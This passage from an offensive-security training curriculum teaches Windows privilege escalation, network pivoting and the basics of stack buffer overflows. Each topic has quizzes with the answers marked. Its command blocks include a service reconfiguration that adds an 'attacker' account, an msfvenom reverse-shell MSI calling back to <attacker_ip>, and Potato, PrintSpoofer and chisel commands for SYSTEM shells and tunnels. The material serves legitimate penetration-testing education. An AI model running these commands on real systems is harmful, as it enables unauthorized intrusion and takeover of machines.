accesschk.exe -uwcqv "Authenticated Users" *
sc config <service_name> binpath= "net user attacker Passw0rd! /add"
sc config <service_name> binpath= "C:\payload.exe"
sc stop <service_name>
sc start <service_name>
```

**Quick Quiz:**

1. A service's binary path is C:\Program Files\My App\service.exe with no quotes around it. Which executable does the Windows SCM attempt to launch first?
   - **C:\Program.exe** ✓
   - C:\Program Files\My App\service.exe
   - C:\Program Files\My.exe
   - C:\Windows\System32\service.exe
   > Faced with unescaped spaces, the SCM tries each space-delimited segment in order starting from the shortest, so C:\Program.exe is attempted before C:\Program Files\My.exe or the real path.
2. An unquoted service path points through a directory you can write to. What else is required before this becomes exploitable?
   - **A way to get the service to (re)start, such as a reboot or SERVICE_START rights** ✓
   - Nothing else — a writable directory alone always leads to code execution as SYSTEM
   - Local administrator credentials
   - The service must already be stopped and disabled
   > The malicious binary only runs once the service actually starts, so a writable directory earlier in the path must be paired with a way to trigger a restart.
3. sc qc <service> already shows the binary path and start-as account. What does accesschk/icacls check that sc qc does not?
   - Whether the service is currently running
   - **Who has permission to reconfigure the service itself, not just view its current config** ✓
   - The service's scheduled trigger time
   - Whether AlwaysInstallElevated is enabled
   > accesschk/icacls reveal the service's ACL — who can reconfigure it (e.g. via sc config) — which is a separate question from what sc qc merely displays.

#### 178. Registry Misconfigurations - AlwaysInstallElevated `[theory]` — Week 14

Windows Installer (MSI) packages can be configured, via Group Policy, to always install with elevated privileges regardless of who's running the install — a setting called AlwaysInstallElevated, meant for enterprises that want standard users to install approved software without a helpdesk ticket. The catch is that MSI itself doesn't distinguish 'approved software' from anything else: if both the HKLM and HKCU AlwaysInstallElevated registry values are set to 1, any user, including a low-privilege one, can hand msiexec an MSI package containing arbitrary code and have it run as SYSTEM, no exploit chain required. Both keys must be present for the policy to actually apply — checking only one and concluding the box isn't vulnerable is a common enumeration mistake. Building the malicious MSI is one line with msfvenom, and installing it silently is one line with msiexec. You finish able to check for this misconfiguration correctly and turn it into a SYSTEM shell in under two commands when it's present.

**Key Points:**

- AlwaysInstallElevated must be set to 1 under BOTH HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer AND HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer for the misconfiguration to be exploitable
- When both are set, any authenticated user can install an MSI as SYSTEM via msiexec regardless of their own privilege level
- msfvenom generates a malicious MSI payload directly with -f msi
- msiexec /quiet /qn /i installs silently with no UI, which is what makes this practical as a privesc technique rather than just a curiosity
- This is a policy misconfiguration, not a code vulnerability — the fix is disabling the two registry values, not patching

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

**Quick Quiz:**

1. You check only HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and find AlwaysInstallElevated set to 1. Can you conclude the box is exploitable?
   - Yes, HKLM alone is sufficient
   - **No — HKCU must also be set to 1, since both keys must be present for the policy to actually apply** ✓
   - No, this key is never used for privesc
   - Yes, but only if the current user is a local administrator
   > AlwaysInstallElevated only applies when both the HKLM and HKCU values are set to 1 — checking only one and stopping there is a common enumeration mistake.
2. What specifically makes AlwaysInstallElevated practical as a privesc technique rather than just a curiosity?
   - **msiexec /quiet /qn /i installs the malicious MSI silently with no UI** ✓
   - msfvenom can only output ELF payloads for this technique
   - It requires physical access to the console
   - It only works if the Print Spooler service is running
   > The /quiet /qn flags let the malicious MSI install with zero visible prompts, which is what turns this into a fast, practical privesc path instead of a noisy one.
3. What is the correct remediation for an AlwaysInstallElevated finding?
   - Apply a Windows patch that fixes the underlying code flaw
   - Reinstall the Windows Installer service
   - **Disable the two registry values, since this is a policy misconfiguration, not a code vulnerability** ✓
   - Block outbound port 4444 at the firewall
   > AlwaysInstallElevated is a Group Policy misconfiguration rather than a code bug, so the fix is disabling the HKLM/HKCU registry values, not patching.

#### 179. Token Impersonation - PrintSpoofer, RoguePotato, JuicyPotato `[theory]` — Week 14

Many Windows service accounts (IIS's application pool identity, SQL Server, and other 'NT SERVICE\*' accounts) hold SeImpersonatePrivilege by default so they can impersonate the client they're serving requests for — an entire family of exploits, nicknamed the 'Potato' family, exists purely to abuse that one privilege to get a full SYSTEM token instead. The common mechanism: coerce a SYSTEM-level component into authenticating to a listener the attacker controls (historically via a COM/DCOM interface tied to a CLSID, more recently by abusing the print spooler's RPC interface), then use the resulting authenticated token, which the attacker's process is now allowed to impersonate, to spawn a process as SYSTEM. PrintSpoofer abuses the print spooler's named-pipe RPC and needs no CLSID; RoguePotato and JuicyPotato instead coerce a DCOM connection back to a listener the attacker controls, with RoguePotato working around the port-135 redirection fix Microsoft shipped that killed the original JuicyPotato technique. Which one works depends on OS build and patch level, so checking whoami /priv for SeImpersonatePrivilege first and then trying PrintSpoofer before the Potato variants is the practical order. You finish able to take a service account with SeImpersonatePrivilege to a SYSTEM shell using real public tooling.

**Key Points:**

- SeImpersonatePrivilege lets a process impersonate the security context of another user/token it receives a connection from — service accounts commonly have it by default
- The 'Potato' family (JuicyPotato, RoguePotato, PrintSpoofer, and successors) all abuse this privilege to obtain a SYSTEM token from a low-privilege service account
- JuicyPotato needs a CLSID (a COM class identifier) valid for the target OS build — a public CLSID list must match the Windows version being attacked, which is why it stopped being reliable on newer builds
- RoguePotato coerces a DCOM authentication back to a redirector the attacker controls, working around Microsoft's port-135 fix that broke the original JuicyPotato
- PrintSpoofer abuses the Print Spooler service's named-pipe impersonation instead of DCOM, so it needs no CLSID and works whenever the Spooler service is running
- whoami /priv showing SeImpersonatePrivilege as enabled is the precondition check before attempting any of these
- All three ultimately spawn an attacker-chosen command running as NT AUTHORITY\SYSTEM

```bash
whoami /priv
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "cmd /c whoami"
RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c whoami > C:\out.txt" -l 9999
JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\out.txt" -l 1337
```

**Quick Quiz:**

1. Which fix did Microsoft ship that broke the original JuicyPotato technique, prompting RoguePotato's workaround?
   - Disabling the Print Spooler service by default
   - Removing SeImpersonatePrivilege from all service accounts
   - **A port-135 redirection fix** ✓
   - Requiring digital signatures on all COM objects
   > RoguePotato coerces a DCOM authentication back to an attacker-controlled redirector specifically to work around the port-135 redirection fix that killed the original JuicyPotato technique.
2. What makes PrintSpoofer mechanistically different from RoguePotato and JuicyPotato?
   - It requires local administrator rights first
   - **It abuses the Print Spooler service's named-pipe impersonation instead of DCOM, so it needs no CLSID** ✓
   - It does not require SeImpersonatePrivilege at all
   - It only works over a network share, never locally
   > PrintSpoofer abuses named-pipe impersonation via the Print Spooler service rather than coercing a DCOM connection, so unlike JuicyPotato/RoguePotato it needs no OS-build-specific CLSID.
3. Before attempting PrintSpoofer, RoguePotato, or JuicyPotato, what precondition should you confirm first?
   - That systeminfo shows a recent patch level
   - **That whoami /priv shows SeImpersonatePrivilege enabled** ✓
   - That AlwaysInstallElevated is set in the registry
   - That a scheduled task is writable
   > All three Potato-family tools abuse SeImpersonatePrivilege, so confirming it's enabled via whoami /priv is the practical precondition check before trying any of them.

#### 180. Scheduled Task Privesc & DLL Hijacking `[theory]` — Week 14

Two more privesc vectors round out the enumeration checklist beyond services and the registry. A scheduled task that runs as SYSTEM (or another privileged account) and points to a binary or script you can write to is functionally identical to the unquoted-path service problem: you don't need to touch the scheduler at all, just replace what it's already going to run, then wait for the trigger or force it with schtasks /run. DLL hijacking works differently: Windows resolves a DLL an application loads by name (not full path) by searching a defined order of directories, and if that search order includes a directory the current user can write to before it reaches the legitimate DLL's real location, dropping a malicious DLL with the exact expected name and exported function signatures there gets it loaded — and executed — in the context of whatever process (often a privileged service) imports it. Finding hijackable DLL loads by hand means either reading the target binary's imports or watching its actual behavior with Process Monitor, filtering for NAME NOT FOUND results on .dll lookups, which reveals every DLL the process searched for but didn't find in an earlier writable directory. You finish able to identify both vectors during a privesc enumeration pass and build a proof-of-concept for each.

**Key Points:**

- A scheduled task running as SYSTEM/admin with a writable binary or script target is exploited by overwriting that target, not by modifying the task itself
- schtasks /query /fo LIST /v shows the task's run-as account, trigger, and 'Task To Run' binary path in one pass
- icacls against a task's target binary/script reveals whether the current user has write access
- DLL hijacking abuses Windows' DLL search order: an app that loads a DLL by name (not full path) can be tricked into loading a malicious DLL placed in a directory searched before the legitimate one
- Process Monitor (Sysinternals procmon) filtered on 'NAME NOT FOUND' + Path ends with .dll is the standard way to discover which DLLs a target process searches for and fails to find
- A hijack payload DLL must export the same function names the legitimate DLL provides, or the loading process will crash instead of running the payload
- schtasks /run /tn <task_name> forces an immediate run instead of waiting for the scheduled trigger, useful once you control the target binary

```bash
schtasks /query /fo LIST /v
icacls C:\Scripts\backup-job.ps1
schtasks /run /tn "\Microsoft\Windows\Backup\BackupTask"
procmon.exe /AcceptEula /Quiet /Minimized /BackingFile trace.pml
```

**Quick Quiz:**

1. You find a scheduled task running as SYSTEM whose target script sits in a directory you can write to. What's the correct exploitation approach?
   - Modify the scheduled task's trigger time so it runs sooner
   - **Overwrite the script the task already points to, then wait for or force the trigger — you don't need to touch the scheduler itself** ✓
   - Delete the task and recreate it with your own binary
   - This can only be exploited if the task is also unquoted
   > A writable scheduled-task target is exploited the same way as an unquoted service path: replace what will already run, since the scheduler configuration itself doesn't need to change.
2. Why must a DLL-hijack payload export the exact same function names as the legitimate DLL it replaces?
   - Otherwise Windows Defender blocks the load automatically
   - Because the search order ignores exported function names entirely
   - **Because the loading process will crash instead of running the payload if the exports don't match** ✓
   - Exported function names only matter for 64-bit DLLs
   > The process that imports the DLL expects specific exported functions to exist; if the malicious DLL doesn't provide them, the process crashes instead of executing the payload.
3. What does filtering Process Monitor output on 'NAME NOT FOUND' for paths ending in .dll reveal?
   - Every DLL currently loaded by every running process
   - **Which DLLs a target process searched for but failed to find in an earlier, writable directory — candidates for hijacking** ✓
   - Which scheduled tasks are misconfigured
   - The service ACL for a given process
   > A 'NAME NOT FOUND' result on a .dll lookup means the process searched a directory for that DLL and didn't find it there, exposing exactly which load attempts a hijack DLL could intercept.

#### 181. SSH Tunneling for Pivoting (Local, Remote, Dynamic) `[theory]` — Week 14

Once a foothold host can reach an internal network your attacking machine can't route to directly, that host becomes a jump box — and if it has an SSH server (or you can reach one, e.g. a Linux pivot point in a mixed environment), plain OpenSSH already ships everything needed to tunnel through it, no extra tooling required. Local forwarding (ssh -L) opens a port on your own machine that forwards, through the SSH connection, to a destination the jump box can reach but you can't — useful for reaching one specific internal service. Remote forwarding (ssh -R) does the reverse: it opens a port on the jump box that forwards back to a service on your machine, useful when you need the target network to reach something you're hosting, like a payload callback. Dynamic forwarding (ssh -D) is the most powerful of the three: it turns your local machine into a SOCKS proxy, so any SOCKS-aware tool (or anything routed through proxychains) can reach anything the jump box can reach, not just one predefined destination. You finish able to choose the right forwarding mode for a given pivoting scenario and stand it up with a single ssh command.

**Key Points:**

- ssh -L <local_port>:<destination_host>:<destination_port> user@jumpbox: local forwarding, reach one destination through the jump box via a port on your own machine
- ssh -R <remote_port>:<local_host>:<local_port> user@jumpbox: remote forwarding, expose a service on your machine to the jump box's network
- ssh -D <local_port> user@jumpbox: dynamic forwarding, turns your machine into a full SOCKS proxy reaching anything the jump box can route to
- Dynamic forwarding is what you pair with proxychains to route arbitrary tools (nmap, curl, browsers) through the pivot instead of just one hardcoded port
- -N tells ssh not to open a remote shell, useful when you only want the tunnel and no interactive session
- -f backgrounds the ssh process after authentication so the tunnel keeps running without holding a foreground terminal
- GatewayPorts yes (server-side sshd_config setting) is required if a remote-forwarded port needs to be reachable from hosts other than the jump box itself, not just localhost on it

```bash
ssh -L 8080:internal-host:80 user@jumpbox
ssh -R 9001:127.0.0.1:4444 user@jumpbox
ssh -D 1080 -N -f user@jumpbox
ssh -L 3389:10.10.10.5:3389 user@jumpbox -N
```

**Quick Quiz:**

1. You want to route nmap, curl, and a browser all through a single pivot host without hardcoding one destination. Which SSH forwarding mode fits?
   - Local forwarding (ssh -L)
   - Remote forwarding (ssh -R)
   - **Dynamic forwarding (ssh -D), which turns your machine into a SOCKS proxy for use with proxychains** ✓
   - None — SSH cannot forward more than one connection at a time
   > Dynamic forwarding (-D) creates a full SOCKS proxy that any SOCKS-aware tool, or anything wrapped in proxychains, can use to reach anything the jump box can reach — not just one predefined destination.
2. You need a service on your attacking machine (e.g. a payload callback listener) to be reachable from the target's internal network through the jump box. Which mode?
   - Local forwarding (ssh -L)
   - **Remote forwarding (ssh -R), which exposes a port on the jump box that forwards back to your machine** ✓
   - Dynamic forwarding (ssh -D)
   - This requires a separate VPN, SSH cannot do this
   > Remote forwarding (-R) opens a port on the jump box side that forwards back to a service on your own machine, which is exactly what's needed for the internal network to reach a callback listener.
3. You set up ssh -R on a jump box but the forwarded port is only reachable from localhost on that jump box, not from other hosts on its network. What sshd_config setting fixes this?
   - PermitRootLogin yes
   - **GatewayPorts yes** ✓
   - PasswordAuthentication yes
   - X11Forwarding yes
   > By default a remote-forwarded port only binds to localhost on the server; GatewayPorts yes is required for it to be reachable from other hosts on the jump box's network.

#### 182. Modern Pivoting Tools - chisel & ligolo-ng `[theory]` — Week 14

SSH tunneling assumes you have SSH somewhere in the chain, which frequently isn't true on a Windows-only pivot host or when the only outbound port available is HTTP/HTTPS through a restrictive firewall. chisel is a fast TCP/UDP tunnel written in Go and compiled as a single static binary for both Windows and Linux, that runs entirely over HTTP, making it far more likely to survive an egress firewall than raw SSH: an attacker-hosted chisel server accepts connections, a client on the pivot host connects out to it, and chisel then exposes a SOCKS proxy (reverse or forward, matching ssh -D's role) or forwards specific ports, all multiplexed over that one HTTP connection. ligolo-ng takes a different, arguably cleaner approach: instead of exposing a SOCKS proxy that every tool has to be told to use, its agent on the pivot host connects back to a proxy server on the attacker's machine, and the attacker adds a real tun network interface with a route into the target's internal subnet — so any tool just works against that subnet with no per-tool SOCKS configuration at all. You finish able to choose between an SSH tunnel, chisel, and ligolo-ng based on what's actually reachable from the compromised host, and stand up either tool's client/server pair.

**Key Points:**

- chisel is a single static Go binary (same tool, client and server modes) that tunnels TCP/UDP over HTTP — useful when only HTTP/HTTPS egress is allowed or SSH isn't present
- chisel server -p 8000 --reverse on the attacker box, chisel client <attacker_ip>:8000 R:socks on the pivot host: opens a reverse SOCKS proxy on the attacker's machine
- chisel's 'reverse' mode matters when the pivot host can reach out to the attacker but the attacker can't reach in — the common real-world direction
- ligolo-ng uses a proxy (attacker side) / agent (pivot side) model plus a real tun interface on the attacker's machine, so routing works transparently instead of requiring SOCKS-aware tools
- ligolo-ng requires creating and bringing up a tun interface on the attacker box (ip tuntap add ... mode tun) before adding a route into the target subnet through it
- Both tools are actively maintained public projects (jpillora/chisel, nicocha30/ligolo-ng) commonly dropped onto a pivot host alongside or instead of native OS tunneling
- Both tools encrypt their tunnel by default: chisel secures its entire tunnel using the SSH protocol (Go's crypto/ssh), transported inside HTTP, while ligolo-ng uses TLS by default for its proxy<->agent connection (hence -selfcert / -ignore-cert for a self-signed cert)

```bash
chisel server -p 8000 --reverse
chisel client <attacker_ip>:8000 R:socks
chisel client <attacker_ip>:8000 R:1080:socks
ligolo-ng proxy -selfcert
agent.exe -connect <attacker_ip>:11601 -ignore-cert
ip tuntap add user $(whoami) mode tun ligolo
ip link set ligolo up
ip route add 10.10.20.0/24 dev ligolo
```

**Quick Quiz:**

1. A Windows-only pivot host has no SSH server, but outbound HTTPS is allowed through the firewall. Which tool is designed for exactly this situation?
   - ligolo-ng, because it requires a tun interface on the pivot host
   - **chisel, a single static Go binary that tunnels TCP/UDP over HTTP** ✓
   - proxychains, since it can create tunnels on its own
   - GatewayPorts yes must be set instead
   > chisel compiles to a single static binary for Windows and Linux and tunnels over HTTP, making it far more likely to survive an egress firewall than raw SSH on a host with no SSH server.
2. Why does ligolo-ng avoid the need to configure every individual tool to speak SOCKS?
   - It disables the target's firewall entirely
   - It only works with tools that already support SOCKS natively
   - **Its proxy/agent model adds a real tun interface with a route into the target subnet, so tools work transparently** ✓
   - It tunnels exclusively over ICMP
   > Unlike a SOCKS proxy that every tool must be told to use, ligolo-ng's attacker-side tun interface with a routed subnet makes any tool work against that subnet with no per-tool configuration.
3. Why would you use chisel's 'reverse' mode (chisel client <attacker_ip>:8000 R:socks) instead of a plain forward connection?
   - Reverse mode encrypts traffic while forward mode does not
   - **It matters when the pivot host can reach out to the attacker but the attacker can't reach in — the common real-world direction** ✓
   - Reverse mode is required for UDP tunneling only
   - It is only needed when ligolo-ng is unavailable
   > Reverse mode has the pivot host's client connect out to the attacker's chisel server, which fits the common scenario where the attacker cannot initiate a connection inbound to the pivot host.

#### 183. proxychains - Routing Tools Through a Pivot `[theory]` — Week 14

Neither ssh -D nor chisel's SOCKS mode is useful on its own if the tools you actually want to run — nmap, curl, a browser — don't know how to speak SOCKS. proxychains solves that by intercepting a program's network calls at the library level (LD_PRELOAD on Linux) and forcing them through a proxy chain defined in proxychains.conf, so any dynamically-linked tool becomes SOCKS-aware without being rewritten or reconfigured itself. The config file lists one or more proxies, most simply a single SOCKS entry pointing at whatever tunnel you already stood up (Tor's default local SOCKS listener, an ssh -D SOCKS proxy, or a chisel/ligolo-ng SOCKS proxy), and proxychains routes the wrapped command's traffic through it as though the command were running with native access to that network. This is the piece that turns a working tunnel into actual usable access: with proxychains.conf pointed at your pivot's SOCKS proxy, proxychains nmap can scan hosts on the internal segment you could never route to directly from your attacking machine. You finish able to configure proxychains against any SOCKS proxy you've stood up and run standard tools through it against a network segment reachable only via the pivot.

**Key Points:**

- proxychains wraps a command and forces its network traffic through a proxy chain defined in /etc/proxychains.conf (or proxychains4.conf)
- The ProxyList section at the bottom of the config takes one proxy per line: <type> <host> <port>, e.g. socks4 127.0.0.1 9050 as the classic Tor-pointing default
- For a tunnel you built yourself (ssh -D, chisel R:socks, ligolo-ng), point proxychains.conf at that proxy's type and port instead, e.g. socks5 127.0.0.1 1080
- dynamic_chain (vs strict_chain) in the config lets proxychains skip a dead proxy in the chain rather than failing outright — useful with a chain of more than one hop
- proxychains <command> <args> is the invocation pattern for any dynamically-linked tool — nmap, curl, smbclient, even a full browser
- TCP connect scans (nmap -sT) work through proxychains; SYN scans (-sS) generally do not, since proxychains can only wrap standard socket connect() calls, not raw packet crafting
- -Pn on nmap is usually required through a proxy chain since ICMP host-discovery pings don't route through a SOCKS proxy

```bash
echo 'socks4 127.0.0.1 9050' >> /etc/proxychains.conf
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap -sT -Pn -p 445,3389 10.10.20.15
proxychains curl http://10.10.20.15/
proxychains smbclient -L 10.10.20.15 -U administrator
```

**Quick Quiz:**

1. You run proxychains nmap -sS -Pn <target> through a pivot and it fails to produce useful results. Why does the SYN scan (-sS) generally not work through proxychains?
   - **proxychains can only wrap standard socket connect() calls, not raw packet crafting** ✓
   - SYN scans are blocked by dynamic_chain specifically
   - proxychains only supports UDP-based scans
   - -sS requires a strict_chain configuration
   > proxychains intercepts standard connect() calls, so TCP connect scans (-sT) work through it, but SYN scans need raw packet crafting that proxychains can't intercept.
2. Why is -Pn typically added to an nmap command run through proxychains?
   - **Because ICMP host-discovery pings don't route through a SOCKS proxy** ✓
   - Because -Pn disables all TCP scanning
   - Because proxychains requires -Pn to load its config file
   - Because -Pn forces the scan to use UDP only
   > nmap's default host discovery relies on ICMP, which doesn't traverse a SOCKS proxy, so -Pn skips discovery and scans the target's ports directly.
3. What is the practical difference between dynamic_chain and strict_chain in proxychains.conf when chaining multiple proxies?
   - strict_chain encrypts traffic, dynamic_chain does not
   - **dynamic_chain skips a dead proxy in the chain rather than failing outright, unlike strict_chain** ✓
   - They are two names for the same behavior
   - dynamic_chain only supports one proxy, strict_chain supports many
   > With dynamic_chain, proxychains can skip over a proxy in the chain that's down; strict_chain requires every hop to succeed in order or the connection fails.

#### 184. Synthesis: Privesc to SYSTEM, Then Pivot Into the Internal Network `[exercise]` — Week 14

Real engagements rarely stop at either half of this module in isolation — a beachhead host is usually a low-value target on a DMZ or edge segment, and the actual objective sits on an internal segment that host can reach but your attacking machine can't. This exercise chains the two halves end to end on a single scenario: land as a low-privilege user on the beachhead, run the enumeration methodology from the first topic to find whichever vector is present (unquoted service path, AlwaysInstallElevated, a SeImpersonatePrivilege service account, or a hijackable scheduled task/DLL), escalate to SYSTEM, then use that SYSTEM-level access to stand up a tunnel — SSH if available, chisel or ligolo-ng if not — into the internal segment the beachhead can reach, and finally run proxychains nmap against that segment to prove the pivot actually works by discovering a host your attacking machine could never see directly. You finish able to narrate and execute the full realistic chain: foothold -> privesc -> SYSTEM -> pivot -> internal network access, the shape almost every multi-host lab and real engagement actually takes.

**Key Points:**

- The realistic order is always enumerate -> privesc -> SYSTEM -> tunnel -> proxychains, not the two halves worked independently
- Which privesc vector is present determines nothing about which pivot tool to use next — they're independent choices driven by what's actually available on each host
- SYSTEM-level access on the beachhead is often what's needed to install/run a persistent tunnel client (a service) rather than just a per-session one
- The pivot only needs to reach hosts the beachhead itself can reach — enumerate the beachhead's own network config (ipconfig /all, route print, arp -a) before assuming a target segment is reachable at all
- Proving the pivot works means demonstrating access to something unreachable without it — a host discovery or port scan result your attacking machine could never produce directly is the concrete evidence
- This exact chain — privesc then pivot — is the backbone of most multi-machine CTF and OSCP-style lab paths, not a contrived combination

```bash
ipconfig /all
route print
arp -a
whoami /priv
PrintSpoofer64.exe -i -c cmd
chisel server -p 8000 --reverse
chisel client <attacker_ip>:8000 R:socks
proxychains nmap -sT -Pn 10.10.20.0/24
```

**Quick Quiz:**

1. Before assuming an internal segment is reachable from a compromised beachhead at all, what should you check first?
   - **The beachhead's own network configuration (ipconfig /all, route print, arp -a)** ✓
   - Whether AlwaysInstallElevated is set on the attacking machine
   - Whether proxychains is installed on the beachhead
   - The CLSID list for the target OS build
   > The pivot can only reach what the beachhead itself can reach, so enumerating its network config first is necessary before assuming any target segment is even reachable.
2. What counts as concrete proof that a pivot into an internal segment actually works?
   - Successfully escalating to SYSTEM on the beachhead
   - **Demonstrating access to something unreachable without the pivot, such as a host-discovery or port-scan result the attacking machine could never produce directly** ✓
   - Confirming whoami /priv shows SeImpersonatePrivilege
   - Confirming the chisel binary was uploaded successfully
   > SYSTEM access and tool uploads are prerequisites, but the pivot is only proven once it produces evidence — like a discovered host — that couldn't have come from the attacking machine directly.
3. Does the specific privesc vector found on a beachhead (e.g. unquoted service path vs. AlwaysInstallElevated) determine which pivot tool should be used afterward?
   - Yes, unquoted-path privesc always pairs with SSH tunneling
   - Yes, AlwaysInstallElevated always requires ligolo-ng
   - **No — privesc vector and pivot tool are independent choices, each driven by what's actually available on the host** ✓
   - No, because pivoting is never possible after a registry-based privesc
   > Which privesc vector is present has no bearing on which pivot tool comes next; both are separately determined by what's actually available on that specific host.


---

## M18: Buffer Overflow & Exploit Development

**Month 4** · Week 15 · 8 topics

Stack-based buffer overflow exploitation is the classic OSCP-style methodology for turning an unbounded write into full remote code execution, and walking through it end-to-end is one of the clearest ways to understand what memory corruption actually means at the CPU level. This module is a guided theory walkthrough of the standard step-by-step process — memory layout, fuzzing, exact-offset discovery, EIP control, bad-character analysis, finding a JMP ESP, and shellcode delivery — using the real, industry-standard tools (Metasploit's pattern_create/pattern_offset, msfvenom, and Immunity Debugger's mona.py) the technique is actually built on. The hands-on lab against a real vulnerable target is a separate exercise; here the goal is to internalize why each step exists and how it feeds the next.

**Learning Outcomes:**

- Draw a function's stack frame and explain why overflowing a fixed-size local buffer can overwrite the saved return address
- Use a cyclic/De Bruijn pattern (pattern_create.rb / pattern_offset.rb) to resolve a crash to the exact byte offset that lands in EIP
- Perform bad-character analysis by sending the full 0x00-0xFF byte range and comparing it against the target's in-memory copy
- Explain why a JMP ESP redirect gets execution into shellcode, how mona.py locates one, and why ASLR/DEP defeat this specific technique on modern systems
- Generate bad-character-free shellcode with msfvenom and assemble a complete padding + return-address + NOP-sled + shellcode exploit buffer

**Module Resources:**

- [corelan.be Exploit Writing Tutorials](https://www.corelan.be) _(link)_
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework) _(tool)_
- [Exploit Database](https://www.exploit-db.com) _(link)_

**Module Quiz (10 questions):**

1. Why does overwriting a function's saved return address on the stack give an attacker control over execution?
   - **Because the return address is the value the CPU jumps to once the function returns** ✓
   - Because it directly modifies the CPU's clock speed
   - Because it changes which registers the ALU can access
   - Because it disables the fetch-decode-execute cycle
   > The saved return address determines where execution resumes after the function returns, so controlling it means controlling where the CPU jumps next.
2. What is the actual purpose of the fuzzing step, given that it only reports a rough byte range like 300-400 rather than an exact number?
   - To generate the final shellcode payload directly
   - **To narrow down roughly where a crash occurs, before a cyclic pattern pinpoints the exact offset** ✓
   - To disable ASLR and DEP on the target before further steps
   - To identify all bad characters in one pass
   > Fuzzing is deliberately coarse, establishing a rough crash range that later steps refine into an exact offset.
3. Why is a De Bruijn (cyclic) pattern used instead of a repeated string of 'A' characters to find the exact offset?
   - It compiles faster than a string of 'A's
   - It bypasses bad character restrictions
   - **Every 4-byte window in the pattern is unique, so the bytes captured in EIP can be traced back to one exact position** ✓
   - It automatically finds a JMP ESP address at the same time
   > The uniqueness of every window in a De Bruijn pattern is what lets pattern_offset.rb resolve a crash value in EIP to a precise offset.
4. After computing an offset, why is a distinct marker like 'BBBB' sent before moving on to bad character analysis or shellcode?
   - To directly execute a test shellcode payload
   - **To confirm the offset is exactly right by verifying EIP reads precisely that marker value** ✓
   - To measure the target's response latency
   - To disable the saved EBP value
   > Seeing EIP overwritten with exactly the chosen marker proves the computed offset is correct before building further on top of it.
5. Why does the value of ESP at the moment of the crash matter for the rest of the exploit?
   - ESP determines the target's bad character list
   - ESP must match the offset value exactly
   - **ESP typically points into the attacker-controlled buffer, which is where shellcode will eventually be placed and where JMP ESP will redirect to** ✓
   - ESP is only relevant if DEP is disabled
   > ESP pointing into the surviving buffer at crash time is exactly what makes a JMP ESP redirect land in the shellcode.
6. Why is 0x00 almost always excluded as a bad character when building the exploit buffer?
   - It always corresponds to the JMP ESP opcode
   - **It terminates C strings, truncating anything in the buffer that comes after it** ✓
   - It is reserved exclusively for the NOP sled
   - It only affects UDP-based services
   > 0x00 is a null terminator in C strings, so its presence would cut the buffer short and corrupt whatever was meant to follow.
7. Why is bad character testing repeated iteratively rather than done once across the whole 0x00-0xFF range?
   - **Because a single bad byte can corrupt everything after it, hiding whether later bytes are also bad, until it's removed and the rest retested** ✓
   - Because mona.py has a hard limit of testing 10 bytes per session
   - Because the target's bad character list changes randomly between runs
   - Because ASLR must be recalculated before each byte is tested
   > One bad byte corrupting the bytes after it means later bytes can't be trusted until the confirmed-bad byte is removed and the range is retested.
8. Why must a usable JMP ESP address come from a module with no ASLR protection?
   - Because ASLR-protected modules cannot contain a JMP ESP instruction at all
   - **Because ASLR randomizes module base addresses each run, making a hardcoded address unreliable across sessions** ✓
   - Because ASLR only affects bad character filtering, not addresses
   - Because non-ASLR modules automatically disable DEP as well
   > A JMP ESP address only stays valid across runs if it comes from a module that loads at a fixed, non-randomized base address.
9. Why does DEP defeat a classic JMP ESP exploit even when the address and offset are both correct?
   - DEP changes the offset calculated during the cyclic pattern step
   - **DEP marks stack memory as non-executable, so even landing on the shellcode there fails to run it, requiring ROP-based bypasses instead** ✓
   - DEP prevents fuzzing from ever reaching the target
   - DEP overwrites the bad character list at runtime
   > DEP's non-executable stack means shellcode placed there cannot run even if EIP correctly redirects execution to it, which is why modern exploitation shifts to ROP.
10. In the final exploit buffer - padding, JMP ESP address, NOP sled, shellcode - what specific purpose does the NOP sled serve?
   - It encrypts the shellcode so bad characters don't matter
   - It replaces the need for an exact offset calculation
   - **It gives landing-zone tolerance, since the jump into the buffer may not be perfectly byte-aligned with the shellcode's start** ✓
   - It stores the return address in little-endian format
   > A run of 0x90 NOP bytes before the shellcode means an imprecise jump can still slide down into the real payload instead of missing it entirely.

### Topics

#### 176. Memory Layout & the Stack (Stack Frames, Saved EBP, Return Address) `[theory]` — Week 15

Every function call in a compiled C program leaves a predictable footprint on the stack, and that predictability is exactly what makes stack-based buffer overflow exploitation possible. When a function is called, the CPU pushes the return address (where execution should resume once the function finishes) onto the stack, then the function's prologue saves the caller's frame pointer (EBP/RBP) and allocates space for local variables — including fixed-size buffers like char buffer[64]. Because the stack grows downward in memory while a buffer written into with strcpy() or gets() fills upward from its start, writing more bytes into that buffer than it was sized for overwrites whatever sits above it in memory: first any adjacent local variables, then the saved EBP, and finally the saved return address itself. On x86 a function frame typically looks like [buffer][other locals][saved EBP][return address][arguments], and an attacker who controls the buffer's contents controls everything written past its bounds. This single fact — a fixed-size stack buffer sitting below a value that decides where the CPU jumps next — is the entire premise of stack-based buffer overflow exploitation. You finish able to draw out a function's stack frame from source code, explain in order which values a buffer overflow overwrites as it grows, and explain precisely why overwriting the saved return address is what turns a crash into control over execution.

**Key Points:**

- The stack grows downward in memory; a buffer written with strcpy()/gets() fills upward from its start with no bounds checking
- Typical x86 frame layout: [local buffer][other locals][saved EBP][return address][function arguments]
- Overflow order as the buffer grows: adjacent local variables first, then the saved EBP, then the saved return address
- The return address is what the CPU jumps to once the function returns — overwriting it means choosing where execution resumes
- This is why it's called a 'stack-based' overflow: the overwritten data (and eventually the return address) all lives on the stack, as opposed to heap-based corruption

**Quick Quiz:**

1. Why does writing more bytes into a fixed-size stack buffer with strcpy() or gets() corrupt adjacent memory instead of just failing safely?
   - The stack grows upward and immediately collides with the heap
   - **strcpy()/gets() perform no bounds checking, so the write simply continues into whatever memory sits above the buffer** ✓
